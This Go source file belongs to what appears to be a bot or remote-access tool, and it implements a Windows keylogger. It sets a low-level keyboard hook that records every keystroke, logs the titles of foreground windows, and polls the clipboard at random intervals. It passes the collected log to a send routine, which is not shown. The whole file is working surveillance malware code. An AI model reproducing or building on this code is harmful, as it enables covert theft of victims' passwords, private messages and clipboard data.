// Package components icludes functionalities required for the bot
package components

import (
	"time"
	"unsafe"

	"github.com/MShoaei/w32"
	"github.com/atotto/clipboard"
)

func startLogger(mode int) {
	if mode == 0 { //Normal logger (everything until told to stop)
		go startListening()
		go clipboardLogger()
		go sendKeylog(ch)
	} else {
		//Selective Keylogger
	}
}

func windowLogger(hook w32.HWINEVENTHOOK, event w32.DWORD, hwnd w32.HWND, idObject w32.LONG, idChild w32.LONG, dwEventThread w32.DWORD, dwmsEventTime w32.DWORD) uintptr {
	if event == w32.EVENT_SYSTEM_FOREGROUND {
		title := w32.GetWindowText(hwnd)
		tmpKeylog.WriteString("\r\n[" + title + "]\r\n")
	}
	if tmpKeylog.Len() >= 1000 || false {
		ch <- struct{}{}
	}
	return 0
}

func clipboardLogger() {
	tmp := ""
	for {
		text, _ := clipboard.ReadAll()
		if text != tmp {
			tmp = text
			tmpKeylog.WriteString("\r\n[Clipboard: " + text + "]\r\n")
		}
		time.Sleep(time.Duration(randInt(3, 7)) * time.Second)
	}
}

//TODO: Add unicode support
// Supports English keyboard layout only!
func keyLogger(nCode int, wparam w32.WPARAM, lparam w32.LPARAM) w32.LRESULT {
	if nCode == 0 && wparam == w32.WM_KEYDOWN {
		kbdstruct := (*w32.KBDLLHOOKSTRUCT)(unsafe.Pointer(lparam))
		shiftchk := w32.GetAsyncKeyState(vkSHIFT)
		if shiftchk == 0x8000 {
			shift = true
		} else {
			shift = false
		}
		// code := w32.MapVirtualKey(uint(kbdstruct.VkCode), w32.MAPVK_VK_TO_CHAR)
		code := kbdstruct.VkCode
		switch code {

		case vkCONTROL:
			tmpKeylog.WriteString("[Ctrl]")
		case vkBACK:
			tmpKeylog.WriteString("[Back]")
		case vkTAB:
			tmpKeylog.WriteString("[Tab]")
		case vkRETURN:
			tmpKeylog.WriteString("[Enter]\r\n")
		case vkSHIFT:
			tmpKeylog.WriteString("[Shift]")
		case vkMENU:
			tmpKeylog.WriteString("[Alt]")
		case vkCAPITAL:
			tmpKeylog.WriteString("[CapsLock]")
			if caps {
				caps = false
			} else {
				caps = true
			}
		case vkESCAPE:
			tmpKeylog.WriteString("[Esc]")
		case vkSPACE:
			tmpKeylog.WriteString(" ")
		case vkPRIOR:
			tmpKeylog.WriteString("[PageUp]")
		case vkNEXT:
			tmpKeylog.WriteString("[PageDown]")
		case vkEND:
			tmpKeylog.WriteString("[End]")
		case vkHOME:
			tmpKeylog.WriteString("[Home]")
		case vkLEFT:
			tmpKeylog.WriteString("[Left]")
		case vkUP:
			tmpKeylog.WriteString("[Up]")
		case vkRIGHT:
			tmpKeylog.WriteString("[Right]")
		case vkDOWN:
			tmpKeylog.WriteString("[Down]")
		case vkSELECT:
			tmpKeylog.WriteString("[Select]")
		case vkPRINT:
			tmpKeylog.WriteString("[Print]")
		case vkEXECUTE:
			tmpKeylog.WriteString("[Execute]")
		case vkSNAPSHOT:
			tmpKeylog.WriteString("[PrintScreen]")
		case vkINSERT:
			tmpKeylog.WriteString("[Insert]")
		case vkDELETE:
			tmpKeylog.WriteString("[Delete]")
		case vkLWIN:
			tmpKeylog.WriteString("[LeftWindows]")
		case vkRWIN:
			tmpKeylog.WriteString("[RightWindows]")
		case vkAPPS:
			tmpKeylog.WriteString("[Applications]")
		case vkSLEEP:
			tmpKeylog.WriteString("[Sleep]")
		case vkNUMPAD0:
			tmpKeylog.WriteString("[Pad 0]")
		case vkNUMPAD1:
			tmpKeylog.WriteString("[Pad 1]")
		case vkNUMPAD2:
			tmpKeylog.WriteString("[Pad 2]")
		case vkNUMPAD3:
			tmpKeylog.WriteString("[Pad 3]")
		case vkNUMPAD4:
			tmpKeylog.WriteString("[Pad 4]")
		case vkNUMPAD5:
			tmpKeylog.WriteString("[Pad 5]")
		case vkNUMPAD6:
			tmpKeylog.WriteString("[Pad 6]")
		case vkNUMPAD7:
			tmpKeylog.WriteString("[Pad 7]")
		case vkNUMPAD8:
			tmpKeylog.WriteString("[Pad 8]")
		case vkNUMPAD9:
			tmpKeylog.WriteString("[Pad 9]")
		case vkMULTIPLY:
			tmpKeylog.WriteString("*")
		case vkADD:
			if shift {
				tmpKeylog.WriteString("+")
			} else {
				tmpKeylog.WriteString("=")
			}
		case vkSEPARATOR:
			tmpKeylog.WriteString("[Separator]")
		case vkSUBTRACT:
			if shift {
				tmpKeylog.WriteString("_")
			} else {
				tmpKeylog.WriteString("-")
			}
		case vkDECIMAL:
			tmpKeylog.WriteString(".")
		case vkDIVIDE:
			tmpKeylog.WriteString("[Devide]")
		case vkF1:
			tmpKeylog.WriteString("[F1]")
		case vkF2:
			tmpKeylog.WriteString("[F2]")
		case vkF3:
			tmpKeylog.WriteString("[F3]")
		case vkF4:
			tmpKeylog.WriteString("[F4]")
		case vkF5:
			tmpKeylog.WriteString("[F5]")
		case vkF6:
			tmpKeylog.WriteString("[F6]")
		case vkF7:
			tmpKeylog.WriteString("[F7]")
		case vkF8:
			tmpKeylog.WriteString("[F8]")
		case vkF9:
			tmpKeylog.WriteString("[F9]")
		case vkF10:
			tmpKeylog.WriteString("[F10]")
		case vkF11:
			tmpKeylog.WriteString("[F11]")
		case vkF12:
			tmpKeylog.WriteString("[F12]")
		case vkNUMLOCK:
			tmpKeylog.WriteString("[NumLock]")
		case vkSCROLL:
			tmpKeylog.WriteString("[ScrollLock]")
		case vkLSHIFT:
			tmpKeylog.WriteString("[LeftShift]")
		case vkRSHIFT:
			tmpKeylog.WriteString("[RightShift]")
		case vkLCONTROL:
			tmpKeylog.WriteString("[LeftCtrl]")
		case vkRCONTROL:
			tmpKeylog.WriteString("[RightCtrl]")
		case vkLMENU:
			tmpKeylog.WriteString("[LeftMenu]")
		case vkRMENU:
			tmpKeylog.WriteString("[RightMenu]")
		case vkOEM1:
			if shift {
				tmpKeylog.WriteString(":")
			} else {
				tmpKeylog.WriteString(";")
			}
		case vkOEM2:
			if shift {
				tmpKeylog.WriteString("?")
			} else {
				tmpKeylog.WriteString("/")
			}
		case vkOEM3:
			if shift {
				tmpKeylog.WriteString("~")
			} else {
				tmpKeylog.WriteString("`")
			}
		case vkOEM4:
			if shift {
				tmpKeylog.WriteString("{")
			} else {
				tmpKeylog.WriteString("[")
			}
		case vkOEM5:
			if shift {
				tmpKeylog.WriteString("|")
			} else {
				tmpKeylog.WriteString("\\")
			}
		case vkOEM6:
			if shift {
				tmpKeylog.WriteString("}")
			} else {
				tmpKeylog.WriteString("]")
			}
		case vkOEM7:
			if shift {
				tmpKeylog.WriteString(`"`)
			} else {
				tmpKeylog.WriteString("'")
			}
		case vkOEMPERIOD:
			if shift {
				tmpKeylog.WriteString(">")
			} else {
				tmpKeylog.WriteString(".")
			}
		case 0x30:
			if shift {
				tmpKeylog.WriteString(")")
			} else {
				tmpKeylog.WriteString("0")
			}
		case 0x31:
			if shift {
				tmpKeylog.WriteString("!")
			} else {
				tmpKeylog.WriteString("1")
			}
		case 0x32:
			if shift {
				tmpKeylog.WriteString("@")
			} else {
				tmpKeylog.WriteString("2")
			}
		case 0x33:
			if shift {
				tmpKeylog.WriteString("#")
			} else {
				tmpKeylog.WriteString("3")
			}
		case 0x34:
			if shift {
				tmpKeylog.WriteString("$")
			} else {
				tmpKeylog.WriteString("4")
			}
		case 0x35:
			if shift {
				tmpKeylog.WriteString("%")
			} else {
				tmpKeylog.WriteString("5")
			}
		case 0x36:
			if shift {
				tmpKeylog.WriteString("^")
			} else {
				tmpKeylog.WriteString("6")
			}
		case 0x37:
			if shift {
				tmpKeylog.WriteString("&")
			} else {
				tmpKeylog.WriteString("7")
			}
		case 0x38:
			if shift {
				tmpKeylog.WriteString("*")
			} else {
				tmpKeylog.WriteString("8")
			}
		case 0x39:
			if shift {
				tmpKeylog.WriteString("(")
			} else {
				tmpKeylog.WriteString("9")
			}
		case 0x41:
			if caps || shift {
				tmpKeylog.WriteString("A")
			} else {
				tmpKeylog.WriteString("a")
			}
		case 0x42:
			if caps || shift {
				tmpKeylog.WriteString("B")
			} else {
				tmpKeylog.WriteString("b")
			}
		case 0x43:
			if caps || shift {
				tmpKeylog.WriteString("C")
			} else {
				tmpKeylog.WriteString("c")
			}
		case 0x44:
			if caps || shift {
				tmpKeylog.WriteString("D")
			} else {
				tmpKeylog.WriteString("d")
			}
		case 0x45:
			if caps || shift {
				tmpKeylog.WriteString("E")
			} else {
				tmpKeylog.WriteString("e")
			}
		case 0x46:
			if caps || shift {
				tmpKeylog.WriteString("F")
			} else {
				tmpKeylog.WriteString("f")
			}
		case 0x47:
			if caps || shift {
				tmpKeylog.WriteString("G")
			} else {
				tmpKeylog.WriteString("g")
			}
		case 0x48:
			if caps || shift {
				tmpKeylog.WriteString("H")
			} else {
				tmpKeylog.WriteString("h")
			}
		case 0x49:
			if caps || shift {
				tmpKeylog.WriteString("I")
			} else {
				tmpKeylog.WriteString("i")
			}
		case 0x4A:
			if caps || shift {
				tmpKeylog.WriteString("J")
			} else {
				tmpKeylog.WriteString("j")
			}
		case 0x4B:
			if caps || shift {
				tmpKeylog.WriteString("K")
			} else {
				tmpKeylog.WriteString("k")
			}
		case 0x4C:
			if caps || shift {
				tmpKeylog.WriteString("L")
			} else {
				tmpKeylog.WriteString("l")
			}
		case 0x4D:
			if caps || shift {
				tmpKeylog.WriteString("M")
			} else {
				tmpKeylog.WriteString("m")
			}
		case 0x4E:
			if caps || shift {
				tmpKeylog.WriteString("N")
			} else {
				tmpKeylog.WriteString("n")
			}
		case 0x4F:
			if caps || shift {
				tmpKeylog.WriteString("O")
			} else {
				tmpKeylog.WriteString("o")
			}
		case 0x50:
			if caps || shift {
				tmpKeylog.WriteString("P")
			} else {
				tmpKeylog.WriteString("p")
			}
		case 0x51:
			if caps || shift {
				tmpKeylog.WriteString("Q")
			} else {
				tmpKeylog.WriteString("q")
			}
		case 0x52:
			if caps || shift {
				tmpKeylog.WriteString("R")
			} else {
				tmpKeylog.WriteString("r")
			}
		case 0x53:
			if caps || shift {
				tmpKeylog.WriteString("S")
			} else {
				tmpKeylog.WriteString("s")
			}
		case 0x54:
			if caps || shift {
				tmpKeylog.WriteString("T")
			} else {
				tmpKeylog.WriteString("t")
			}
		case 0x55:
			if caps || shift {
				tmpKeylog.WriteString("U")
			} else {
				tmpKeylog.WriteString("u")
			}
		case 0x56:
			if caps || shift {
				tmpKeylog.WriteString("V")
			} else {
				tmpKeylog.WriteString("v")
			}
		case 0x57:
			if caps || shift {
				tmpKeylog.WriteString("W")
			} else {
				tmpKeylog.WriteString("w")
			}
		case 0x58:
			if caps || shift {
				tmpKeylog.WriteString("X")
			} else {
				tmpKeylog.WriteString("x")
			}
		case 0x59:
			if caps || shift {
				tmpKeylog.WriteString("Y")
			} else {
				tmpKeylog.WriteString("y")
			}
		case 0x5A:
			if caps || shift {
				tmpKeylog.WriteString("Z")
			} else {
				tmpKeylog.WriteString("z")
			}
		}
	}
	// counts bytes. Should add time based log sending
	if tmpKeylog.Len() >= 1000 || false {
		ch <- struct{}{}
	}
	return w32.CallNextHookEx(keyboardHook, nCode, wparam, lparam)
}

func startListening() {
	keyboardHook = w32.SetWindowsHookEx(w32.WH_KEYBOARD_LL, keyLogger, 0, 0)
	gHook = w32.SetWinEventHook(w32.EVENT_SYSTEM_FOREGROUND, w32.EVENT_SYSTEM_FOREGROUND, 0, windowLogger, 0, 0, w32.WINEVENT_SKIPOWNPROCESS)
	cleanup()
	// quit <- struct{}{}
}

func cleanup() {
	select {
	case <-quit:
		w32.UnhookWindowsHookEx(keyboardHook)
		w32.UnhookWinEvent(gHook)
		keyboardHook = 0
		gHook = 0
	}
}
